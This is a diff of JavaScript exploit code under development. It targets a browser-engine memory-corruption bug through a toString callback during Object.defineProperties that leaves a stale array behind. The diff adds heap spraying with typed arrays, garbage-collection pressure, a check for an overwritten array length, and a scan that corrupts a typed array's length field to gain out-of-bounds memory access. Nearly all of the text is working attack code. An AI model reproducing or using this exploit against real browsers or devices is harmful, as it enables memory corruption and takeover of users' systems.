@@ -27,45 +27,34 @@ if(onSwitch !== undefined) {
 
 log('Loaded');
 
+var rwbuf = new ArrayBuffer(0x1001 * 4);
+var tu = new Uint32Array(rwbuf);
+for(var i = 0; i < tu.length; ++i)
+	tu[i] = ((i & 1) == 0) ? 0x41424344 : 0x41414141;
+
+function pressureGC() {
+	var pressure = new Array(4000);
+	log('Pressurizing');
+	for (var i = 0; i < pressure.length; i++) {
+		pressure[i] = new Uint32Array(0x1000);
+	}
+	for (var i = 0; i < pressure.length; ++i)
+		pressure[i] = 0;
+}
+
+var bufs;
+function allocBuffers() {
+	bufs = new Array(1500000);
+	log('Making ' + bufs.length + ' buffers');
+	for(var i = 0; i < bufs.length; ++i) {
+		bufs[i] = new Uint32Array(rwbuf);
+	}
+}
+
 function doItAll() {
 	log('Starting');
 
-	_dview = null;
-
-	function u2d(low, hi) {
-		if (!_dview) _dview = new DataView(new ArrayBuffer(16));
-		_dview.setUint32(0, hi);
-		_dview.setUint32(4, low);
-		return _dview.getFloat64(0);
-	}
-
-	var pressure = new Array(400);
-	var bufs = new Array(20000);
-
-	dgc = function() {
-		log('Pressurizing');
-		for (var i = 0; i < pressure.length; i++) {
-			pressure[i] = new Uint32Array(0x10000);
-		}
-		for (var i = 0; i < pressure.length; ++i)
-			pressure[i] = 0;
-	}
-
-	function swag() {
-		if(bufs[0]) return;
-
-		dgc();
-
-		log('Building buffers');
-		for (i=0; i < bufs.length; i++) {
-			bufs[i] = new Uint32Array(0x200*2)
-			for (k=0; k < bufs[i].length; )
-			{
-				bufs[i][k++] = 0x41414141;
-				bufs[i][k++] = 0xffff0000;
-			}
-		}
-	}
+	bufs = undefined;
 
 	var arr = new Array(0x100);
 	var yolo = new ArrayBuffer(0x1000);
@@ -76,7 +65,12 @@ function doItAll() {
 	not_number.toString = function() {
 		arr = null;
 		props["stale"]["value"] = null;
-		swag();
+
+		if(bufs === undefined) {
+			//pressureGC();
+			allocBuffers();
+		}
+
 		return 10;
 	};
 
@@ -101,66 +95,50 @@ function doItAll() {
 	Object.defineProperties(target, props);
 	stale = target.stale;
 
+	log('Checking if triggered...');
 	if(stale.length == before_len) {
 		log('Failed to overwrite array');
+		location.reload();
 		return;
 	}
 
 	log('Triggered.  New length: 0x' + stale.length.toString(16));
 
-	if(stale.length != 0x41414141) {
+	/*if(stale.length != 0x1001) {
 		log('Bailing.');
 		location.reload();
 		return;
-	}
+	}*/
 
-	stale[5] = 0xDEADBEEF;
+	var temp = new Uint32Array(0x10);
+	stale[1] = temp;
 
-	log('Attempting to find buffer');
+	log('Looking for buf...');
 
 	function dumpbuf(count) {
 		for(var j = 0; j < count; ++j)
-			log('Buf[' + j + '] == 0x' + buf[k + j].toString(16));
+			log('Buf[' + j + '] == ' + bufs[i][j]);
 	}
 
-	var rwu32 = new Uint32Array(0x10);
-
-	for (i=0; i < bufs.length; i++) {
-		for (k=0; k < bufs[i].length; ) {
-			if(bufs[i][k] != 0x41414141){
-				var buf = tlbuf = bufs[i];
-				tlstale = stale;
-				tlk = k;
-
-				stale[5] = {'a':u2d(0x60, 0x1172600),'b':u2d(0,0),'c':rwu32,'d':u2d(0x100,0)};
-				stale[6] = stale[5];
-				log(stale[5]);
-
-				log('Dumping partial buffer...');
-				dumpbuf(8);
-
-				var off = 0x10;
-
-				buf[k] += off;
-				log(stale[5]);
-				//log(stale[5][0]);
-				stale[5][6] = 0x69;
-				buf[k] -= off;
-
-				log('Checking...');
-				//log(stale[5]);
-				log(rwu32.length);
-				log('Dumping partial buffer...');
-				dumpbuf(8);
-				return;
-			}
-			k++;
-			k++;
+	for(var i = 0; i < bufs.length; ++i) {
+		if(bufs[i][0] != 0x41424344) {
+			alert('!');
+			log('Changed value! ' + bufs[i][0]);
+			alert('...');
+			log('Length ' + bufs[i].length);
+			alert('!');
+			dumpbuf(16);
+			log('Setting length...');
+			bufs[i][6] = 0x40;
+			log('Set...');
+			log(temp.length);
+			alert('?');
+		} else if(bufs[i].length != tu.length) {
+			alert('?');
+			log('Length changed but not value.  ' + bufs[i].length);
 		}
 	}
 
 	log('Done');
 }
 
-if(onSwitch === undefined)
-	doItAll();
